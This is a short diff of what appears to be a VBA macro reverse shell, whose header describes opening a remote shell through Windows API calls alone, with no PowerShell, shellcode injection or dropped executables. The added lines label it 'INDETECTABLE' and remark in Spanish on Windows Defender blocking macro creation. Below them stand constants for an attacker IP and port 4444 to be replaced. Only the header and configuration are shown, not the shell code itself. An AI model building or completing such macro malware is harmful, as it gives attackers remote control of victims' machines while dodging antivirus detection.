@@ -1,7 +1,8 @@
 'Reverse shell using only Windows API calls, no Powershell, shellcode injection, or dropping exe's.
 'Author: John Woodman
 'Twitter: @JohnWoodman15
-
+' INDETECTABLE
+'Windows Defender impide impide creacion de macros
 'Replace with your IP and Port
 Const ip = "192.168.100.12"
 Const port = "4444"
